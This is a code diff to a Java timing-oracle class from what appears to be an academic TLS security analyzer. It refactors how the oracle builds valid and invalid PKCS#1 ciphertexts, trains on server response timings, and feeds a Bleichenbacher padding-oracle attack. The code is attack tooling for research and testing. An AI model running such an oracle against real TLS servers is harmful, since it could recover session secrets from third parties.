@@ -5,7 +5,6 @@
 package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;
 
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
-import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
 import de.rub.nds.ssl.stack.workflows.commons.ESupportedSockets;
 import de.rub.nds.tinytlssocket.TLSServer;
 import java.io.FileInputStream;
@@ -37,62 +36,6 @@ public class TimingOracle extends ATimingOracle {
      * Log4j logger initialization.
      */
     private static Logger logger = Logger.getRootLogger();
-    /**
-     * Plain PKCS message
-     */
-    private static final byte[] plainPKCS = new byte[]{
-        (byte) 0x00, (byte) 0x02, (byte) 0xf5, (byte) 0xa7, (byte) 0x9f,
-        (byte) 0xcd, (byte) 0xb1, (byte) 0x27, (byte) 0xf9, (byte) 0x39,
-        (byte) 0x15, (byte) 0x21, (byte) 0x49, (byte) 0x71, (byte) 0x65,
-        (byte) 0x97, (byte) 0x33, (byte) 0x99, (byte) 0x6d, (byte) 0x9b,
-        (byte) 0xcd, (byte) 0x6d, (byte) 0x4b, (byte) 0xe3, (byte) 0xf5,
-        (byte) 0xfd, (byte) 0xb5, (byte) 0x71, (byte) 0xd5, (byte) 0x69,
-        (byte) 0x71, (byte) 0x91, (byte) 0xb9, (byte) 0x39, (byte) 0xc9,
-        (byte) 0x6d, (byte) 0xf5, (byte) 0x59, (byte) 0xf1, (byte) 0xb9,
-        (byte) 0x97, (byte) 0xb7, (byte) 0x6b, (byte) 0xff, (byte) 0x33,
-        (byte) 0xd1, (byte) 0x9b, (byte) 0x85, (byte) 0x13, (byte) 0xd5,
-        (byte) 0x09, (byte) 0xb5, (byte) 0x33, (byte) 0xc9, (byte) 0x2d,
-        (byte) 0xcf, (byte) 0xff, (byte) 0x53, (byte) 0xd7, (byte) 0xed,
-        (byte) 0xd5, (byte) 0x1d, (byte) 0x45, (byte) 0x4d, (byte) 0xc9,
-        (byte) 0xcb, (byte) 0x4b, (byte) 0x27, (byte) 0x21, (byte) 0x5f,
-        (byte) 0x69, (byte) 0xf5, (byte) 0x67, (byte) 0x5d, (byte) 0xab,
-        (byte) 0x9b, (byte) 0xf5, (byte) 0xc3, (byte) 0xc3, (byte) 0xaf,
-        (byte) 0x7f, (byte) 0x6d, (byte) 0xa1, (byte) 0xe5, (byte) 0xfd,
-        (byte) 0x3d, (byte) 0x93, (byte) 0xbb, (byte) 0x29, (byte) 0x11,
-        (byte) 0x9b, (byte) 0x59, (byte) 0x5f, (byte) 0x11, (byte) 0x17,
-        (byte) 0x17, (byte) 0xaf, (byte) 0x71, (byte) 0x33, (byte) 0xd7,
-        (byte) 0x3f, (byte) 0x1b, (byte) 0x2f, (byte) 0x2b, (byte) 0xcd,
-        (byte) 0x77, (byte) 0xfd, (byte) 0x3f, (byte) 0x5d, (byte) 0x67,
-        (byte) 0x3b, (byte) 0x8f, (byte) 0xcd, (byte) 0xc5, (byte) 0x07,
-        (byte) 0x6f, (byte) 0x59, (byte) 0x2b, (byte) 0xa7, (byte) 0x0d,
-        (byte) 0xd3, (byte) 0x93, (byte) 0x87, (byte) 0x8d, (byte) 0x25,
-        (byte) 0x47, (byte) 0x3b, (byte) 0xf7, (byte) 0x2d, (byte) 0xf9,
-        (byte) 0x69, (byte) 0xdd, (byte) 0xe5, (byte) 0x85, (byte) 0x79,
-        (byte) 0x7d, (byte) 0xc9, (byte) 0x09, (byte) 0xb7, (byte) 0xb7,
-        (byte) 0x3d, (byte) 0x07, (byte) 0x23, (byte) 0x25, (byte) 0x07,
-        (byte) 0x71, (byte) 0xb9, (byte) 0x1b, (byte) 0xcf, (byte) 0x15,
-        (byte) 0x99, (byte) 0xdf, (byte) 0xb5, (byte) 0x6b, (byte) 0x29,
-        (byte) 0x21, (byte) 0x4d, (byte) 0x4b, (byte) 0xf5, (byte) 0x31,
-        (byte) 0x37, (byte) 0x9b, (byte) 0x43, (byte) 0x89, (byte) 0xd9,
-        (byte) 0xef, (byte) 0x81, (byte) 0x55, (byte) 0x61, (byte) 0x4f,
-        (byte) 0xc9, (byte) 0xff, (byte) 0xcf, (byte) 0x49, (byte) 0x73,
-        (byte) 0xa9, (byte) 0x7f, (byte) 0xcb, (byte) 0xb5, (byte) 0x4f,
-        (byte) 0x9d, (byte) 0xa5, (byte) 0xc9, (byte) 0x97, (byte) 0x3d,
-        (byte) 0x9b, (byte) 0xf1, (byte) 0x9f, (byte) 0xf1, (byte) 0x95,
-        (byte) 0xf9, (byte) 0x07, (byte) 0xa7, (byte) 0x95, (byte) 0xd5,
-        (byte) 0xef, (byte) 0xd3, (byte) 0x4b, (byte) 0x27, (byte) 0x1f,
-        (byte) 0x1f, (byte) 0x27, (byte) 0x9f, (byte) 0x5d, (byte) 0x8f,
-        (byte) 0x39, (byte) 0x1b, (byte) 0x00, (byte) 0x03, (byte) 0x01,
-        (byte) 0x06, (byte) 0x26, (byte) 0xa6, (byte) 0x40, (byte) 0x57,
-        (byte) 0x4b, (byte) 0x50, (byte) 0xd6, (byte) 0xa3, (byte) 0xd0,
-        (byte) 0x8a, (byte) 0x70, (byte) 0x16, (byte) 0x0a, (byte) 0x0d,
-        (byte) 0xaf, (byte) 0x33, (byte) 0x2a, (byte) 0x7f, (byte) 0x9b,
-        (byte) 0xc8, (byte) 0x65, (byte) 0xa7, (byte) 0xb5, (byte) 0x54,
-        (byte) 0xe7, (byte) 0x48, (byte) 0x9f, (byte) 0x57, (byte) 0xda,
-        (byte) 0xc9, (byte) 0xbf, (byte) 0x34, (byte) 0x8b, (byte) 0x8d,
-        (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
-        (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
-        (byte) 0x40};
     private Cipher cipher;
     private TLSServer sslServer;
     /**
@@ -146,9 +89,11 @@ public class TimingOracle extends ATimingOracle {
     private int counterRequest = 0;
     ArrayList<Long> validTimings = new ArrayList<Long>(trainingAmount);
     ArrayList<Long> invalidTimings = new ArrayList<Long>(trainingAmount);
-    // TODO: just for debugging
-    public byte[] encPMSWrong;
-    public byte[] encPMS;
+    private byte[] encInvalidPKCS;
+    private byte[] encValidPKCS;
+    private byte[] invalidPKCS;
+    private byte[] validPKCS;
+    private boolean pmsValid;
 
     /**
      * Constructor
@@ -159,9 +104,11 @@ public class TimingOracle extends ATimingOracle {
      */
     public TimingOracle(final String serverAddress, final int serverPort,
             final PrivateKey privateKey, final OracleType oracleType,
-            final byte[] validPMS)
+            final byte[] validPlainPKCS, final byte[] invalidPlainPKCS,
+            boolean containsValidPMS)
             throws SocketException, NoSuchAlgorithmException,
-            InvalidKeyException, NoSuchPaddingException, GeneralSecurityException, IOException {
+            InvalidKeyException, NoSuchPaddingException,
+            GeneralSecurityException, IOException {
         super(serverAddress, serverPort);
         Security.addProvider(new BouncyCastleProvider());
 
@@ -169,25 +116,32 @@ public class TimingOracle extends ATimingOracle {
         cipher = Cipher.getInstance("RSA/None/NoPadding");
         cipher.init(Cipher.DECRYPT_MODE, privateKey);
 
-        setPlainPMS(new PreMasterSecret(validPMS));
-        byte[] plainPKCS_wrong = new byte[validPMS.length];
-        System.arraycopy(validPMS, 0, plainPKCS_wrong, 0, validPMS.length);
-        plainPKCS_wrong[0] = 23;
-        this.publicKey = (RSAPublicKey) fetchServerPublicKey(serverAddress, serverPort);
-        encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
+        this.publicKey = (RSAPublicKey) fetchServerPublicKey(serverAddress,
+                serverPort);
+        invalidPKCS = new byte[invalidPlainPKCS.length];
+        System.arraycopy(invalidPlainPKCS, 0, invalidPKCS, 0,
+                invalidPKCS.length);
+        encInvalidPKCS = encryptHelper(invalidPlainPKCS, publicKey);
+
+        validPKCS = new byte[validPlainPKCS.length];
+        System.arraycopy(validPlainPKCS, 0, validPKCS, 0, validPKCS.length);
+        encValidPKCS = encryptHelper(validPlainPKCS, publicKey);
+
+        this.pmsValid = containsValidPMS;
+
     }
 
-    private boolean isValidPMS(byte[] testPMS) {
+    private boolean isValidPKCS(byte[] testPKCS) {
         boolean result;
 
         counterRequest++;
-        result = isValidPMS(testPMS, measurementAmount);
+        result = isValidPKCS(testPKCS, measurementAmount);
 
         if (result == true) {
             System.out.
                     println(
                     "Found a candidate for a valid key. Checking again with more measurements.");
-            result = isValidPMS(testPMS,
+            result = isValidPKCS(testPKCS,
                     measurementAmount * measurementFactorForValidation);
         }
 
@@ -207,7 +161,7 @@ public class TimingOracle extends ATimingOracle {
      * @return true if testKey is significantly different from invalidKey and
      * thus valid.
      */
-    private boolean isValidPMS(byte[] testPMS, int amountOfMeasurements) {
+    private boolean isValidPKCS(byte[] testPMS, int amountOfMeasurements) {
 
         long[] measurementsTest = new long[amountOfMeasurements];
         long[] measurementsInvalid = new long[amountOfMeasurements];
@@ -216,7 +170,7 @@ public class TimingOracle extends ATimingOracle {
             try {
                 executeWorkflow(testPMS, ESupportedSockets.TimingSocket);
                 measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());
-                executeWorkflow(encPMSWrong, ESupportedSockets.TimingSocket);
+                executeWorkflow(encInvalidPKCS, ESupportedSockets.TimingSocket);
                 measurementsInvalid[i] = getTimeDelay(getWorkflow().
                         getTraceList());
             } catch (OracleException ex) {
@@ -226,20 +180,21 @@ public class TimingOracle extends ATimingOracle {
         }
         try {
             FileWriter fwInvalid = new FileWriter("invalid.csv", true);
-            for(long time : measurementsInvalid) {
+            for (long time : measurementsInvalid) {
                 fwInvalid.write(time + "\n");
             }
             fwInvalid.close();
-            
+
             FileWriter fwTest = new FileWriter("test.csv", true);
-            for(long time : measurementsTest) {
+            for (long time : measurementsTest) {
                 fwTest.write(time + "\n");
             }
             fwTest.close();
         } catch (IOException ex) {
-            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
+                    log(Level.SEVERE, null, ex);
         }
-        
+
 
         Arrays.sort(measurementsTest);
         Arrays.sort(measurementsInvalid);
@@ -260,28 +215,42 @@ public class TimingOracle extends ATimingOracle {
 
         return result;
     }
-    
-    public void warmUp(byte[] validRequest, byte[] invalidRequest) throws OracleException{
-        System.out.print("warmup... ");
-        for (int i = 0; i < warmupAmount / 2; i++) {
-            executeWorkflow(invalidRequest, ESupportedSockets.TimingSocket);
 
-            executeWorkflow(validRequest, ESupportedSockets.TimingSocket);
+    public void warmUp() throws
+            OracleException {
+        System.out.print("warmup... ");
+        byte[] pms = new byte[48];
+        System.arraycopy(validPKCS, validPKCS.length - pms.length, pms, 0,
+                pms.length);
+        for (int i = 0; i < warmupAmount / 2; i++) {
+            // invalid case
+            setEncPKCSStructure(encInvalidPKCS);
+            executeWorkflow(encInvalidPKCS, ESupportedSockets.TimingSocket);
+
+            // valid case
+            if (pmsValid) {
+                // if the initialized PMS is valid let's set it!
+                setPlainPMS(pms);
+            }
+            setEncPKCSStructure(encValidPKCS);
+            executeWorkflow(encValidPKCS, ESupportedSockets.TimingSocket);
             System.out.println(i + "th round");
         }
         System.out.println("done!");
     }
 
     @Override
-    public void trainOracle(byte[] validRequest, byte[] invalidRequest)
+    public void trainOracle(byte[] validEncPKCS, byte[] invalidEncPKCS)
             throws OracleException {
 
         // warmup
         System.out.print("warmup... ");
         for (int i = 0; i < warmupAmount / 2; i++) {
-            executeWorkflow(invalidRequest, ESupportedSockets.TimingSocket);
+            setEncPKCSStructure(invalidEncPKCS);
+            executeWorkflow(invalidEncPKCS, ESupportedSockets.TimingSocket);
 
-            executeWorkflow(validRequest, ESupportedSockets.TimingSocket);
+            setEncPKCSStructure(validEncPKCS);
+            executeWorkflow(validEncPKCS, ESupportedSockets.TimingSocket);
             System.out.println(i + "th round");
         }
         System.out.println("done!");
@@ -289,15 +258,17 @@ public class TimingOracle extends ATimingOracle {
         long delay;
         // train the oracle using the executeWorkflow functionality
         for (int i = 0; i < trainingAmount; i++) {
-            executeWorkflow(validRequest, ESupportedSockets.TimingSocket);
+            executeWorkflow(validEncPKCS, ESupportedSockets.TimingSocket);
             delay = getTimeDelay(getWorkflow().getTraceList());
             validTimings.add(delay);
 
-            executeWorkflow(invalidRequest, ESupportedSockets.TimingSocket);
+            executeWorkflow(invalidEncPKCS, ESupportedSockets.TimingSocket);
             delay = getTimeDelay(getWorkflow().getTraceList());
             invalidTimings.add(delay);
 
-            System.out.print("\r left requests for training " + (trainingAmount - i));
+            System.out.
+                    print(
+                    "\r left requests for training " + (trainingAmount - i));
         }
         System.out.println("\n");
         FileWriter fw = null;
@@ -306,11 +277,14 @@ public class TimingOracle extends ATimingOracle {
 
             for (int i = 0; i < trainingAmount; i++) {
                 fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
-                fw.write((i + trainingAmount) + ";valid;" + validTimings.get(i) + "\n");
+                fw.
+                        write((i + trainingAmount) + ";valid;" + validTimings.
+                        get(i) + "\n");
             }
             fw.close();
         } catch (IOException ex) {
-            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
+                    log(Level.SEVERE, null, ex);
         }
 //            
 //            long[] temp = new long[trainingAmount];
@@ -335,13 +309,14 @@ public class TimingOracle extends ATimingOracle {
             for (int i = 0; i < 100; i++) {
                 if (i % 2 == 0) {
                     System.out.
-                            println("TRUE  : Ground truth: " + cheat(encPMS) + ", timing: " + isValidPMS(
-                            encPMS));
+                            println("TRUE  : Ground truth: " + cheat(
+                            encValidPKCS) + ", timing: " + isValidPKCS(
+                            encValidPKCS));
                 } else {
                     System.out.
                             println(
-                            "FALSE : Ground truth: " + cheat(encPMSWrong) + ", timing: " + isValidPMS(
-                            encPMSWrong));
+                            "FALSE : Ground truth: " + cheat(encInvalidPKCS) + ", timing: " + isValidPKCS(
+                            encInvalidPKCS));
                 }
             }
         } catch (IllegalBlockSizeException ex) {
@@ -401,26 +376,26 @@ public class TimingOracle extends ATimingOracle {
     }
 
     @Override
-    public boolean checkPKCSConformity(byte[] encPMS) throws OracleException {
+    public boolean checkPKCSConformity(byte[] encPKCS) throws OracleException {
         boolean ret = false;
         boolean groundTruth = false;
-        
+
         counterOracle += 1;
 
         try {
-            groundTruth = cheat(encPMS);
-            
-            if(counterOracle < 1890) {
-                if(counterOracle % 100 == 0) {
+            groundTruth = cheat(encPKCS);
+
+            if (counterOracle < 1890) {
+                if (counterOracle % 100 == 0) {
                     System.out.print("\r" + counterOracle);
                 }
-                if(groundTruth == true) {
-                    System.out.println( counterOracle + "TRUE!!!");
+                if (groundTruth == true) {
+                    System.out.println(counterOracle + "TRUE!!!");
                 }
                 return groundTruth;
             }
-            
-            boolean test = isValidPMS(encPMS);
+
+            boolean test = isValidPKCS(encPKCS);
 
             if (groundTruth == false) {
                 if (test == false) {
@@ -524,9 +499,9 @@ public class TimingOracle extends ATimingOracle {
 //            plainPKCS_wrong[0] = 23;
 //
 //            to.encPMS = encryptHelper(plainPKCS, publicKey);
-//            to.encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
+//            to.encInvalidPKCS = encryptHelper(plainPKCS_wrong, publicKey);
 //
-//            to.trainOracle(to.encPMS, to.encPMSWrong);
+//            to.trainOracle(to.encPMS, to.encInvalidPKCS);
 //            to.plausibilityCheck();
 //
 //            Bleichenbacher attacker = new Bleichenbacher(to.encPMS, to, true);
